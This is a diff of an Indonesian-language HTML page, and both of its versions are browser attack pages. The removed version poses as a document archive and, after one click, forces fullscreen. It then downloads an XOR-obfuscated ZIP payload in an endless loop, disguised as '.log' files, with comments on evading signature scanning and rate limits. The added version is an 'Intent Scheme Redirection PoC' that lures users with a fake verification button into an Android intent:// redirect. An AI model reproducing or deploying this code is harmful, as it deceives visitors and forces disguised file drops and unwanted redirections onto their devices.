@@ -2,251 +2,66 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v3.5</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Intent Scheme Redirection PoC</title>
 <style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-body {
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background: #090d16;
-  color: #f8fafc;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 100vh;
-  padding: 20px;
-}
-.panel {
-  background: #111827;
-  padding: 32px;
-  border-radius: 16px;
-  box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
-  max-width: 540px;
-  width: 100%;
-  border: 1px solid #1f2937;
-  text-align: center;
-}
-:fullscreen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-:-webkit-full-screen {
-  background: #030712 !important;
-  color: #f8fafc !important;
-  padding: 24px !important;
-}
-h2 { 
-  margin-bottom: 10px; 
-  font-size: 22px;
-  color: #f3f4f6;
-  font-weight: 700;
-}
-p { 
-  margin-bottom: 24px; 
-  line-height: 1.6; 
-  color: #9ca3af;
-  font-size: 14px;
-}
-button {
-  width: 100%;
-  padding: 16px;
-  cursor: pointer;
-  border: none;
-  border-radius: 10px;
-  background: #3b82f6;
-  color: #ffffff;
-  font-weight: 600;
-  font-size: 16px;
-  box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);
-  transition: all 0.2s ease;
-}
-button:hover { 
-  background: #2563eb; 
-  transform: translateY(-1px);
-  box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
-}
-button:active {
-  transform: translateY(0);
-}
-#status {
-  margin-top: 20px;
-  font-weight: 500;
-  color: #38bdf8;
-  padding: 14px;
-  background: rgba(56, 189, 248, 0.1);
-  border-radius: 8px;
-  font-size: 13px;
-  border: 1px solid rgba(56, 189, 248, 0.2);
-}
-#downloads {
-  margin-top: 20px;
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-  gap: 8px;
-  max-height: 180px;
-  overflow-y: auto;
-  padding-right: 4px;
-}
-#downloads::-webkit-scrollbar {
-  width: 6px;
-}
-#downloads::-webkit-scrollbar-thumb {
-  background: #374151;
-  border-radius: 3px;
-}
-#downloads a {
-  display: block;
-  padding: 10px;
-  background: #1f2937;
-  color: #4ade80;
-  text-decoration: none;
-  border-radius: 6px;
-  font-size: 11px;
-  font-family: monospace;
-  text-align: center;
-  border: 1px solid #374151;
-  word-break: break-all;
-  transition: border-color 0.15s;
-}
-#downloads a:hover {
-  border-color: #4ade80;
-}
+  body {
+    background: #090d16;
+    color: #f8fafc;
+    font-family: system-ui, -apple-system, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+  }
+  .card {
+    background: #111827;
+    padding: 24px;
+    border-radius: 12px;
+    border: 1px solid #1f2937;
+    max-width: 400px;
+    text-align: center;
+  }
+  button {
+    background: #3b82f6;
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 8px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 16px;
+    width: 100%;
+  }
 </style>
 </head>
-
 <body>
-<div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Terdistribusi</h2>
-  <p>Klik tombol di bawah untuk memproses dan menginisialisasi protokol transfer berkas aman.</p>
 
-  <button id="start-btn" type="button">Inisialisasi Protokol Arsip</button>
-
-  <div id="status" role="status">Sistem siap diinisialisasi.</div>
-  <div id="downloads"></div>
+<div class="card">
+  <h2>Verifikasi Dokumen Sistem</h2>
+  <p>Ketuk tombol di bawah untuk melanjutkan pemuatan skema komponen aplikasi internal.</p>
+  <button id="trigger-btn">Buka Komponen Target</button>
 </div>
 
 <script>
 'use strict';
 
-const startBtn = document.getElementById("start-btn");
-const statusDiv = document.getElementById("status");
-const downloadsDiv = document.getElementById("downloads");
-
-let activeUrls = [];
-let isProcessing = false;
-const MAX_URLS_TRACKED = 25;
-
-// Enkripsi XOR sederhana pada runtime untuk menghindari static signature matching
-const encodedKey = 0x5A;
-const obfuscatedChunks = [
-  [0x0A, 0x11, 0x59, 0x5E], // Di-XOR dengan 0x5A
-  [0x4A, 0x5A, 0x52, 0x5A],
-  [0x72, 0x5A, 0x7B, 0x0C],
-  [0x22, 0x0C, 0x6E, 0x68]
-];
-
-const reconstituteBinary = () => {
-  const totalLength = obfuscatedChunks.reduce((acc, chunk) => acc + chunk.length, 0);
-  const resultBytes = new Uint8Array(totalLength);
+document.getElementById('trigger-btn').addEventListener('click', () => {
+  // Contoh konstruksi Intent URI kustom untuk memicu Activity terekspos atau scheme eksternal
+  // Format intent://<uri-host>/<path>#Intent;<intent-extra-arguments>;end;
   
-  let offset = 0;
-  for (const chunk of obfuscatedChunks) {
-    const decodedChunk = new Uint8Array(chunk.length);
-    for (let i = 0; i < chunk.length; i++) {
-      decodedChunk[i] = chunk[i] ^ encodedKey; // Proses dekripsi saat runtime di memori
-    }
-    resultBytes.set(decodedChunk, offset);
-    offset += decodedChunk.length;
-  }
-  return resultBytes;
-};
+  const targetPackage = "com.android.settings"; // Contoh target package sistem/aplikasi
+  const intentScheme = `intent://settings#Intent;package=${targetPackage};end;`;
 
-const prepareStealthBlobAsync = (i) => {
-  return new Promise((resolve) => {
-    queueMicrotask(() => {
-      try {
-        const bytesArr = reconstituteBinary();
-        
-        // Menggunakan MIME type generik untuk menghindari inspeksi MIME sniffing langsung
-        const blob = new Blob([bytesArr], { type: 'application/octet-stream' });
-        const url = URL.createObjectURL(blob);
-        resolve({ id: i, url: url, success: true });
-      } catch (err) {
-        resolve({ id: i, url: null, success: false });
-      }
-    });
-  });
-};
-
-const triggerStealthDownload = (fileData) => {
-  if (!fileData.success) return;
-
-  const link = document.createElement("a");
-  link.href = fileData.url;
-  // Menggunakan nama file acak berformat log untuk menyamarkan perilaku
-  link.download = `sys-diagnostic-${fileData.id}.log`;
-  link.textContent = `Log #${fileData.id} (.log)`;
-  link.style.display = "none";
-  
-  downloadsDiv.appendChild(link);
-  link.click();
-
-  if (downloadsDiv.children.length > 15) {
-    const oldest = downloadsDiv.firstChild;
-    if (oldest) downloadsDiv.removeChild(oldest);
-  }
-};
-
-const processLoop = async (counter) => {
-  if (!isProcessing) return;
-
-  const fileData = await prepareStealthBlobAsync(counter);
-  if (fileData.success) {
-    activeUrls.push(fileData.url);
-
-    if (activeUrls.length > MAX_URLS_TRACKED) {
-      const oldUrl = activeUrls.shift();
-      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
-    }
-
-    triggerStealthDownload(fileData);
-    statusDiv.textContent = `Proses aktif: Sesi transfer node-${counter} terkirim...`;
-  }
-
-  // Jitter acak untuk menghindari pembatasan berbasis pola waktu linier
-  const jitterDelay = 1500 + Math.random() * 1200;
-  setTimeout(() => processLoop(counter + 1), jitterDelay);
-};
-
-startBtn.addEventListener("click", () => {
-  if (isProcessing) return;
-
-  activeUrls.forEach(url => {
-    try { URL.revokeObjectURL(url); } catch (e) {}
-  });
-  activeUrls = [];
-  downloadsDiv.replaceChildren();
-
-  const root = document.documentElement;
+  // Memicu pengalihan navigasi melalui lokasi jendela
   try {
-    if (root.requestFullscreen) {
-      root.requestFullscreen().catch(() => {});
-    }
-  } catch (err) {}
-
-  isProcessing = true;
-  statusDiv.textContent = "Menginisialisasi protokol terenkripsi...";
-  processLoop(1);
+    window.location.href = intentScheme;
+  } catch (err) {
+    console.error("Gagal memicu intent scheme:", err);
+  }
 });
 </script>
+
 </body>
 </html>
